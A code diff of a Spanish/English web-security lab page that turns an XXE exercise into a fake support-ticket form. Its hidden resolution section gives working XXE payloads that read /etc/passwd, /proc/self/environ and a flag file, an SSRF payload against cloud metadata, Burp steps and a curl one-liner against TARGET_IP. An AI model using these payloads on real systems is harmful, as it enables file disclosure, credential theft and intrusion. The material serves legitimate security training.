@@ -4,93 +4,318 @@
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
 
+  <!-- ── Formulario de Tickets de Soporte ───────────────── -->
   <div class="hl-card mb-4">
-    <form method="POST" action="/xxe" class="space-y-4">
+    <div class="flex items-center gap-2 mb-4">
+      <svg class="w-5 h-5 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z"/></svg>
+      <h2 class="text-base font-bold text-gray-800 dark:text-white" data-i18n="xxe_form_title">Crear Ticket de Soporte</h2>
+    </div>
+    <form id="ticketForm" class="space-y-3">
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Nombre completo</label>
+          <input type="text" name="name" class="hl-input" placeholder="Juan Pérez" required>
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Email</label>
+          <input type="email" name="email" class="hl-input" placeholder="juan@empresa.com" required>
+        </div>
+      </div>
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Departamento</label>
+          <select name="subject" class="hl-input">
+            <option value="Soporte Técnico">Soporte Técnico</option>
+            <option value="Ventas">Ventas</option>
+            <option value="Recursos Humanos">Recursos Humanos</option>
+            <option value="Administración">Administración</option>
+            <option value="Seguridad IT">Seguridad IT</option>
+          </select>
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Prioridad</label>
+          <select id="priority" class="hl-input">
+            <option value="baja">🟢 Baja</option>
+            <option value="media" selected>🟡 Media</option>
+            <option value="alta">🟠 Alta</option>
+            <option value="critica">🔴 Crítica</option>
+          </select>
+        </div>
+      </div>
       <div>
-        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_xml_payload">Payload XML</label>
-        <textarea name="xml_data" rows="7" class="hl-input font-mono"
-                  placeholder="&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;email&gt;alice@test.com&lt;/email&gt;&lt;/user&gt;">{{ xml_input | e }}</textarea>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Descripción del problema</label>
+        <textarea name="message" rows="3" class="hl-input" placeholder="Describe el problema con detalle..." required></textarea>
       </div>
-      <div class="flex gap-2 flex-wrap">
-        <button type="submit" class="btn-primary" data-i18n="btn_parse_xml">Parsear XML</button>
-        <button type="button" onclick="loadPayload('normal')"
-                class="px-3 py-2 text-xs font-medium rounded-lg border border-gray-200 dark:border-gray-600 text-gray-600 dark:text-gray-400 hover:border-primary transition" data-i18n="xxe_btn_normal">
-          XML Normal
-        </button>
-        <button type="button" onclick="loadPayload('xxe')"
-                class="px-3 py-2 text-xs font-semibold rounded-lg border border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-dark-900 transition" data-i18n="xxe_btn_xxe">
-          Payload XXE
-        </button>
-      </div>
+      <button type="submit" class="btn-primary w-full sm:w-auto">
+        <svg class="w-4 h-4 inline mr-1 -mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
+        Enviar Ticket
+      </button>
     </form>
   </div>
 
-  {% if error %}
-  <div class="alert-error mb-4 text-xs font-mono">{{ error }}</div>
-  {% endif %}
-  {% if result %}
-  <div class="hl-card mb-4 border-l-4" style="border-left-color:var(--hl-primary)">
-    <div class="text-xs font-semibold mb-2" style="color:var(--hl-primary)" data-i18n="xxe_parsed">Resultado parseado</div>
+  <!-- ── Resultado (ticket creado) ──────────────────────── -->
+  <div id="ticketResult" class="hl-card mb-4 border-l-4 hidden" style="border-left-color:var(--hl-primary)">
+    <div class="flex items-center gap-2 mb-3">
+      <svg class="w-5 h-5" style="color:var(--hl-primary)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      <span class="text-sm font-bold" style="color:var(--hl-primary)">Ticket creado con éxito</span>
+      <span id="ticketId" class="ml-auto text-xs font-mono bg-gray-100 dark:bg-gray-800 px-2 py-0.5 rounded"></span>
+    </div>
     <div class="space-y-1.5 font-mono text-sm">
-      <div><span class="text-gray-400" data-i18n="xxe_name">nombre: </span><span class="text-gray-800 dark:text-gray-200">{{ result.name }}</span></div>
-      <div><span class="text-gray-400" data-i18n="xxe_email">email: </span><span class="text-gray-800 dark:text-gray-200">{{ result.email }}</span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0">Nombre:</span><span id="resName" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0">Email:</span><span id="resEmail" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0">Asunto:</span><span id="resSubject" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0">Mensaje:</span><span id="resMessage" class="text-gray-800 dark:text-gray-200 break-all whitespace-pre-wrap"></span></div>
     </div>
   </div>
-  {% endif %}
+
+  <!-- ── Error ──────────────────────────────── -->
+  <div id="ticketError" class="alert-error mb-4 text-xs font-mono hidden"></div>
+
+  <!-- ── Tickets recientes (decorativo) ────────────────── -->
+  <div class="hl-card mb-4 opacity-75">
+    <div class="text-xs font-semibold text-gray-500 dark:text-gray-400 mb-3 uppercase tracking-wide">Tickets recientes</div>
+    <div class="overflow-x-auto">
+      <table class="w-full text-xs">
+        <thead>
+          <tr class="text-left text-gray-400 border-b border-gray-200 dark:border-gray-700">
+            <th class="pb-2 pr-3 font-medium">ID</th>
+            <th class="pb-2 pr-3 font-medium">Usuario</th>
+            <th class="pb-2 pr-3 font-medium">Asunto</th>
+            <th class="pb-2 font-medium">Estado</th>
+          </tr>
+        </thead>
+        <tbody class="text-gray-600 dark:text-gray-400">
+          <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83421</td><td class="pr-3">María López</td><td class="pr-3">Soporte Técnico</td><td><span class="text-green-500">✓ Resuelto</span></td></tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83419</td><td class="pr-3">Carlos Ruiz</td><td class="pr-3">Seguridad IT</td><td><span class="text-yellow-500">⏳ Pendiente</span></td></tr>
+          <tr><td class="py-1.5 pr-3 font-mono">TK-83415</td><td class="pr-3">Ana Martín</td><td class="pr-3">Administración</td><td><span class="text-green-500">✓ Resuelto</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 </div>
 
+<!-- ── Resolución ─────────────────────────────────────── -->
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
-    <h3>Pasos de explotación</h3>
+    <h3>Análisis de la vulnerabilidad</h3>
+    <p>El formulario de tickets envía los datos al servidor como <strong>XML</strong> (Content-Type: application/xml). El parser del backend (<code>lxml</code>) tiene habilitada la resolución de entidades externas, lo que permite XXE.</p>
+
+    <h3>Pasos de explotación con Burp Suite</h3>
     <ol>
-      <li>El servidor usa <code>xml.etree.ElementTree</code> sin deshabilitar entidades externas.</li>
-      <li>Haz clic en "XXE Payload" o introduce manualmente el payload:</li>
+      <li>Abre <strong>Burp Suite</strong> y configura el proxy del navegador.</li>
+      <li>Rellena el formulario de tickets con cualquier dato y pulsa <strong>"Enviar Ticket"</strong>.</li>
+      <li>En Burp → <strong>Proxy → HTTP history</strong>, localiza la petición <code>POST /xxe/api</code>.</li>
+      <li>Haz clic derecho → <strong>Send to Repeater</strong>.</li>
+      <li>En el <strong>Repeater</strong>, verás el body XML original:</li>
     </ol>
-    <pre>&lt;?xml version="1.0"?&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;user&gt;
+    <pre>&lt;ticket&gt;
+  &lt;name&gt;Juan Pérez&lt;/name&gt;
+  &lt;email&gt;juan@empresa.com&lt;/email&gt;
+  &lt;subject&gt;Soporte Técnico&lt;/subject&gt;
+  &lt;message&gt;Mi problema...&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+    <ol start="6">
+      <li>Modifica el body para inyectar una entidad externa XXE:</li>
+    </ol>
+    <h4>Leer /etc/passwd</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
   &lt;email&gt;test@test.com&lt;/email&gt;
-&lt;/user&gt;</pre>
-    <ol start="3">
-      <li>El contenido del archivo <code>/etc/passwd</code> aparecerá en el campo <code>name</code> del resultado.</li>
-      <li>Prueba con otros archivos: <code>file:///etc/hostname</code>, <code>file:///etc/shadow</code></li>
-      <li>También puedes usar el protocolo HTTP para SSRF: <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></li>
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>Leer la flag secreta</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/flag.txt"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>SSRF – Acceder a servicios internos</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <ol start="7">
+      <li>Pulsa <strong>Send</strong> en el Repeater. El contenido del archivo aparece en el campo <code>name</code> de la respuesta JSON.</li>
+      <li>Prueba con diferentes archivos: <code>/etc/hostname</code>, <code>/app/secret/flag.txt</code>, <code>/proc/self/environ</code></li>
     </ol>
+
+    <h3>¿Por qué funciona?</h3>
+    <ul>
+      <li>El servidor parsea directamente el XML del cliente con <code>lxml</code> usando <code>resolve_entities=True</code> y <code>load_dtd=True</code>.</li>
+      <li>Esto permite definir entidades que el parser resuelve leyendo archivos locales (<code>file://</code>) o realizando peticiones HTTP (<code>http://</code>).</li>
+      <li>El valor expandido se refleja en la respuesta JSON → el atacante ve el contenido.</li>
+    </ul>
+
+    <h3>Cómo descubrirlo en un pentest real</h3>
+    <ul>
+      <li>Interceptar tráfico en Burp y buscar peticiones con <code>Content-Type: application/xml</code> o <code>text/xml</code>.</li>
+      <li>Cualquier endpoint que acepte XML es candidato a XXE.</li>
+      <li>Probar inyecciones de DOCTYPE en el body y observar si el servidor refleja, produce errores o cambia de comportamiento.</li>
+    </ul>
+
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span> <span class="tools-badge">XXEinjector</span></div>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
+
+    <h3>Explotación con curl</h3>
+    <pre>curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
-    <h3>Exploitation Steps</h3>
+    <h3>Vulnerability Analysis</h3>
+    <p>The ticket form sends data to the server as <strong>XML</strong> (Content-Type: application/xml). The backend parser (<code>lxml</code>) has external entity resolution enabled, allowing XXE.</p>
+
+    <h3>Exploitation Steps with Burp Suite</h3>
     <ol>
-      <li>The server uses <code>xml.etree.ElementTree</code> without disabling external entities.</li>
-      <li>Click "XXE Payload" or manually enter the payload:</li>
+      <li>Open <strong>Burp Suite</strong> and configure the browser proxy.</li>
+      <li>Fill in the ticket form with any data and click <strong>"Enviar Ticket"</strong>.</li>
+      <li>In Burp → <strong>Proxy → HTTP history</strong>, find the <code>POST /xxe/api</code> request.</li>
+      <li>Right-click → <strong>Send to Repeater</strong>.</li>
+      <li>In the <strong>Repeater</strong>, you'll see the original XML body:</li>
     </ol>
-    <pre>&lt;?xml version="1.0"?&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;user&gt;
+    <pre>&lt;ticket&gt;
+  &lt;name&gt;Juan Pérez&lt;/name&gt;
+  &lt;email&gt;juan@empresa.com&lt;/email&gt;
+  &lt;subject&gt;Soporte Técnico&lt;/subject&gt;
+  &lt;message&gt;My problem...&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+    <ol start="6">
+      <li>Modify the body to inject an XXE external entity:</li>
+    </ol>
+    <h4>Read /etc/passwd</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;ticket&gt;
   &lt;name&gt;&amp;xxe;&lt;/name&gt;
   &lt;email&gt;test@test.com&lt;/email&gt;
-&lt;/user&gt;</pre>
-    <ol start="3">
-      <li>The contents of <code>/etc/passwd</code> will appear in the <code>name</code> field of the result.</li>
-      <li>Try other files: <code>file:///etc/hostname</code>, <code>file:///etc/shadow</code></li>
-      <li>You can also use the HTTP protocol for SSRF: <code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></li>
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>Read the secret flag</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/flag.txt"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>SSRF – Access internal services</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <ol start="7">
+      <li>Click <strong>Send</strong> in the Repeater. The file contents appear in the <code>name</code> field of the JSON response.</li>
+      <li>Try different files: <code>/etc/hostname</code>, <code>/app/secret/flag.txt</code>, <code>/proc/self/environ</code></li>
     </ol>
+
+    <h3>Why does it work?</h3>
+    <ul>
+      <li>The server parses client XML directly with <code>lxml</code> using <code>resolve_entities=True</code> and <code>load_dtd=True</code>.</li>
+      <li>This allows defining entities that the parser resolves by reading local files (<code>file://</code>) or making HTTP requests (<code>http://</code>).</li>
+      <li>The expanded value is reflected in the JSON response → the attacker sees the contents.</li>
+    </ul>
+
+    <h3>How to discover it in a real pentest</h3>
+    <ul>
+      <li>Intercept traffic in Burp and look for requests with <code>Content-Type: application/xml</code> or <code>text/xml</code>.</li>
+      <li>Any endpoint accepting XML is a candidate for XXE.</li>
+      <li>Try injecting DOCTYPE in the body and observe if the server reflects, errors out, or changes behavior.</li>
+    </ul>
+
     <h3>Tools</h3>
-    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span> <span class="tools-badge">XXEinjector</span></div>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
+
+    <h3>Exploitation with curl</h3>
+    <pre>curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
   </div>
 </div>
 {% endblock %}
 
 {% block scripts %}
 <script>
-const payloads = {
-  normal: `<user>\n  <name>Alice</name>\n  <email>alice@hacklabs.local</email>\n</user>`,
-  xxe:    `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<user>\n  <name>&xxe;</name>\n  <email>test@evil.com</email>\n</user>`
-};
-function loadPayload(type) {
-  document.querySelector('textarea[name="xml_data"]').value = payloads[type];
-}
+document.getElementById('ticketForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const form = e.target;
+  const name    = form.querySelector('[name="name"]').value;
+  const email   = form.querySelector('[name="email"]').value;
+  const subject = form.querySelector('[name="subject"]').value;
+  const message = form.querySelector('[name="message"]').value;
+
+  // Construir XML a partir de los datos del formulario
+  const xml = `<ticket>
+  <name>${name}</name>
+  <email>${email}</email>
+  <subject>${subject}</subject>
+  <message>${message}</message>
+</ticket>`;
+
+  fetch('/xxe/api', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/xml' },
+    body: xml
+  })
+  .then(r => r.json())
+  .then(data => {
+    const resultDiv = document.getElementById('ticketResult');
+    const errorDiv  = document.getElementById('ticketError');
+
+    if (data.status === 'ok') {
+      errorDiv.classList.add('hidden');
+      resultDiv.classList.remove('hidden');
+      document.getElementById('ticketId').textContent = data.ticket.id;
+      document.getElementById('resName').textContent    = data.ticket.name;
+      document.getElementById('resEmail').textContent   = data.ticket.email;
+      document.getElementById('resSubject').textContent = data.ticket.subject;
+      document.getElementById('resMessage').textContent = data.ticket.message;
+    } else {
+      resultDiv.classList.add('hidden');
+      errorDiv.classList.remove('hidden');
+      errorDiv.textContent = data.message;
+    }
+  })
+  .catch(err => {
+    const errorDiv = document.getElementById('ticketError');
+    document.getElementById('ticketResult').classList.add('hidden');
+    errorDiv.classList.remove('hidden');
+    errorDiv.textContent = 'Error de conexión: ' + err.message;
+  });
+});
 </script>
 {% endblock %}
